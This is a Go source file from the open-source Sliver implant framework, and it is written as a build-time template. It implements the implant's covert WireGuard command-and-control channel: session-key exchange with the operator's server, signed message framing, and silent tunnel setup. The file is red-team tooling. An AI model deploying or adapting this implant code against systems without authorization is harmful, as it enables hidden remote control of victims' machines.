//go:build windows || darwin || linux

package wireguard

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.IncludeWG}}

import (
	"bufio"
	"bytes"
	"crypto/ed25519"
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"net/netip"
	"strconv"
	"strings"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"

	"github.com/bishopfox/sliver/implant/sliver/netstack"
	"golang.org/x/crypto/blake2b"
	"golang.zx2c4.com/wireguard/conn"
	"golang.zx2c4.com/wireguard/device"
	"golang.zx2c4.com/wireguard/tun"
	"google.golang.org/protobuf/proto"
)

var (
	// YamuxPreface - Magic bytes sent before yamux frames
	YamuxPreface = "MUX/1"

	serverTunIP = "100.64.0.1" // Don't let user configure this for now
	tunnelNet   *netstack.Net
	tunAddress  string

	wgImplantPrivKey  = `{{.Build.WGImplantPrivKey}}`
	wgServerPubKey    = `{{.Build.WGServerPubKey}}`
	wgPeerTunIP       = `{{.Config.WGPeerTunIP}}`
	wgKeyExchangePort = getWgKeyExchangePort()
	wgTcpCommsPort    = getWgTcpCommsPort()

	wgSessPrivKey string
	wgSessPubKey  string

	PingInterval = 2 * time.Minute
	failedConn   = 0
)

const wgEnvelopeSigningSeedPrefix = "env-signing-v1:"

var (
	envelopeSigningOnce  sync.Once
	envelopeSigningErr   error
	envelopeSigningKeyID uint64
	envelopeSigningPriv  ed25519.PrivateKey
)

func wgEnvelopeSigningKey() (ed25519.PrivateKey, uint64, error) {
	envelopeSigningOnce.Do(func() {
		peerKeyPair := cryptography.GetPeerAgeKeyPair()
		// NOTE: This file is rendered with Go's text/template; avoid literal template
		// delimiters in string checks or the template parser will treat it as an action.
		if peerKeyPair == nil || peerKeyPair.Private == "" || strings.Contains(peerKeyPair.Private, ".Build.PeerPrivateKey") {
			envelopeSigningErr = errors.New("[wireguard] missing peer private key")
			return
		}

		seed := sha256.Sum256([]byte(wgEnvelopeSigningSeedPrefix + peerKeyPair.Private))
		envelopeSigningPriv = ed25519.NewKeyFromSeed(seed[:])

		pub := envelopeSigningPriv.Public().(ed25519.PublicKey)
		digest := blake2b.Sum256(pub)
		envelopeSigningKeyID = binary.LittleEndian.Uint64(digest[:8])
	})

	return envelopeSigningPriv, envelopeSigningKeyID, envelopeSigningErr
}

// GetTNet - Get the netstack Net object
func GetTNet() *netstack.Net {
	return tunnelNet
}

// GetTUNAddress - Get the TUN address
func GetTUNAddress() string {
	return tunAddress
}

// WriteEnvelope - Writes a message to the wireguard socket using length prefix framing
// which is a fancy way of saying we write the length of the message then the message
// e.g. [uint32 length|message] so the receiver can delimit messages properly
func WriteEnvelope(connection net.Conn, envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("Envelope marshaling error: ", err)
		// {{end}}
		return err
	}

	signingKey, keyID, err := wgEnvelopeSigningKey()
	if err != nil {
		return err
	}
	rawSigBuf := make([]byte, cryptography.RawSigSize)
	binary.LittleEndian.PutUint16(rawSigBuf[:2], cryptography.EdDSA)
	binary.LittleEndian.PutUint64(rawSigBuf[2:10], keyID)
	copy(rawSigBuf[10:], ed25519.Sign(signingKey, data))
	if _, werr := connection.Write(rawSigBuf); werr != nil {
		// {{if .Config.Debug}}
		log.Print("Socket error (write raw signature): ", werr)
		// {{end}}
		return werr
	}

	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	if _, werr := connection.Write(dataLengthBuf.Bytes()); werr != nil {
		// {{if .Config.Debug}}
		log.Print("Socket error (write msg-length): ", werr)
		// {{end}}
		return werr
	}
	if _, werr := connection.Write(data); werr != nil {
		// {{if .Config.Debug}}
		log.Print("Socket error (write msg): ", werr)
		// {{end}}
		return werr
	}
	return nil
}

// WritePing - Write a ping message to the wireguard connection
func WritePing(connection net.Conn) error {
	// {{if .Config.Debug}}
	log.Print("Socket ping")
	// {{end}}

	// We don't need a real nonce here, we just need to write to the socket
	pingBuf, _ := proto.Marshal(&pb.Ping{Nonce: 31337})
	envelope := pb.Envelope{
		Type: pb.MsgPing,
		Data: pingBuf,
	}
	return WriteEnvelope(connection, &envelope)
}

// ReadEnvelope - Reads a message from the wireguard connection using length prefix framing
func ReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
	rawSigBuf := make([]byte, cryptography.RawSigSize)
	dataLengthBuf := make([]byte, 4) // Size of uint32
	if len(rawSigBuf) == 0 || len(dataLengthBuf) == 0 || connection == nil {
		panic("[[GenerateCanary]]")
	}

	n, err := io.ReadFull(connection, rawSigBuf)
	if err != nil || n != len(rawSigBuf) {
		// {{if .Config.Debug}}
		log.Printf("Socket error (read raw signature): %v\n", err)
		// {{end}}
		return nil, err
	}

	n, err = io.ReadFull(connection, dataLengthBuf)
	if err != nil || n != 4 {
		// {{if .Config.Debug}}
		log.Printf("Socket error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))

	if dataLength <= 0 {
		// {{if .Config.Debug}}
		log.Printf("[pivot] read error: %s\n", err)
		// {{end}}
		return nil, errors.New("[wireguard] zero data length")
	}

	dataBuf := make([]byte, dataLength)

	n, err = io.ReadFull(connection, dataBuf)

	if err != nil || n != dataLength {
		// {{if .Config.Debug}}
		log.Printf("Read error: %s\n", err)
		// {{end}}
		return nil, err
	}

	if !cryptography.MinisignVerifyRaw(dataBuf, rawSigBuf) {
		// {{if .Config.Debug}}
		log.Printf("Invalid signature on wireguard envelope")
		// {{end}}
		return nil, errors.New("[wireguard] invalid signature")
	}

	// Unmarshal the protobuf envelope
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unmarshal envelope error: %v", err)
		// {{end}}
		return nil, err
	}

	return envelope, nil
}

func formatWGEndpoint(address string, port uint16) string {
	return net.JoinHostPort(address, strconv.Itoa(int(port)))
}

// getSessKeys - Connect to the wireguard server and retrieve session specific keys and IP
func getSessKeys(address string, port uint16) error {
	_, dev, tNet, err := bringUpWGInterface(address, port, wgImplantPrivKey, wgServerPubKey, wgPeerTunIP)
	if err != nil {
		return err
	}

	if err := dev.Up(); err != nil {
		return err
	}

	// {{if .Config.Debug}}
	log.Printf("Initial wg connection. Attempting to connect to wg key exchange listener")
	// {{end}}

	keyExchangeConnection, err := tNet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, wgKeyExchangePort))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unable to connect to wg key exchange listener: %v", err)
		// {{end}}
		_ = dev.Down()
		return err
	}

	wgSessPrivKey, wgSessPubKey, tunAddress = doKeyExchange(keyExchangeConnection)

	// {{if .Config.Debug}}
	log.Printf("Signaling wg device to go down")
	// {{end}}

	// Close initial wireguard connection
	err = dev.Down()

	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to close device.Device: %s", err)
		// {{end}}
		return err
	}
	return nil
}

// WGConnect - Get a wg connection or die trying
func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
	if wgSessPrivKey == "" || failedConn > 2 {
		if err := getSessKeys(address, port); err != nil {
			failedConn++
			return nil, nil, err
		}
	}

	// Bring up actual wireguard connection using retrieved keys and IP
	_, dev, tNet, err := bringUpWGInterface(address, port, wgSessPrivKey, wgSessPubKey, tunAddress)
	if err != nil {
		failedConn++
		return nil, nil, err
	}

	connection, err := tNet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, wgTcpCommsPort))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unable to connect to sliver listener: %v", err)
		// {{end}}
		failedConn++
		return nil, nil, err
	}

	// {{if .Config.Debug}}
	log.Printf("Successfully connected to sliver listener")
	// {{end}}
	failedConn = 0
	tunnelNet = tNet
	return connection, dev, nil
}

// bringUpWGInterface - First creates an inet.af network stack.
// then creates a Wireguard device/interface and applies configuration
func bringUpWGInterface(address string, port uint16, implantPrivKey string, serverPubKey string, netstackTunIP string) (tun.Device, *device.Device, *netstack.Net, error) {
	if netstackTunIP == "" {
		err := errors.New("[wireguard] Cannot connect to empty IP address")
		return nil, nil, nil, err
	}

	tun, tNet, err := netstack.CreateNetTUN(
		[]netip.Addr{netip.MustParseAddr(netstackTunIP)},
		[]netip.Addr{netip.MustParseAddr("127.0.0.1")}, // We don't use DNS in the WG implant. Yet.
		1420)
	if err != nil {
		// {{if .Config.Debug}}
		log.Panic(err)
		// {{end}}
	}

	wgLogLevel := device.LogLevelSilent
	// {{if .Config.Debug}}
	wgLogLevel = device.LogLevelVerbose
	// {{end}}

	dev := device.NewDevice(tun, conn.NewDefaultBind(), device.NewLogger(wgLogLevel, "[c2/wg] "))
	wgConf := bytes.NewBuffer(nil)
	fmt.Fprintf(wgConf, "private_key=%s\n", implantPrivKey)
	fmt.Fprintf(wgConf, "public_key=%s\n", serverPubKey)
	fmt.Fprintf(wgConf, "endpoint=%s\n", formatWGEndpoint(address, port))
	fmt.Fprintf(wgConf, "allowed_ip=%s/0\n", "0.0.0.0")

	// {{if .Config.Debug}}
	log.Printf("Configuring wg device with: %s", wgConf.String())
	// {{end}}

	if err := dev.IpcSetOperation(bufio.NewReader(wgConf)); err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to set wg device config: %s", err)
		// {{end}}
		return nil, nil, nil, err
	}
	// {{if .Config.Debug}}
	log.Printf("Successfully set wg device config")
	// {{end}}

	return tun, dev, tNet, nil
}

// doKeyExchange - Connect to key exchange listener and retrieve new dynamic wg keys
func doKeyExchange(conn net.Conn) (string, string, string) {
	// {{if .Config.Debug}}
	log.Printf("Connected to key exchange listener")
	// {{end}}
	defer conn.Close()

	// 129 = 64 byte key + 1 byte delimiter + 64 byte key + 1 byte delimiter + 16 byte ip address
	buff := make([]byte, 146)
	buffReader := bufio.NewReader(conn)

	_, err := io.ReadFull(buffReader, buff)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to read wg keys from key exchange listener: %s", err)
		// {{end}}
	}

	stringSlice := strings.Split(string(buff), "|")
	// {{if .Config.Debug}}
	log.Printf("Retrieved new keys, priv:%s, pub:%s, ip:%s", stringSlice[0], stringSlice[1], net.IP(stringSlice[2]).String())
	// {{end}}
	return stringSlice[0], stringSlice[1], net.IP(stringSlice[2]).String()
}

func getWgKeyExchangePort() int {
	wgKeyExchangePort, err := strconv.Atoi(`{{.Config.WGKeyExchangePort}}`)
	if err != nil {
		return 1337
	}
	return wgKeyExchangePort
}

func getWgTcpCommsPort() int {
	wgTcpCommsPort, err := strconv.Atoi(`{{.Config.WGTcpCommsPort}}`)
	if err != nil {
		return 8888
	}
	return wgTcpCommsPort
}

// {{end}} -IncludeWG
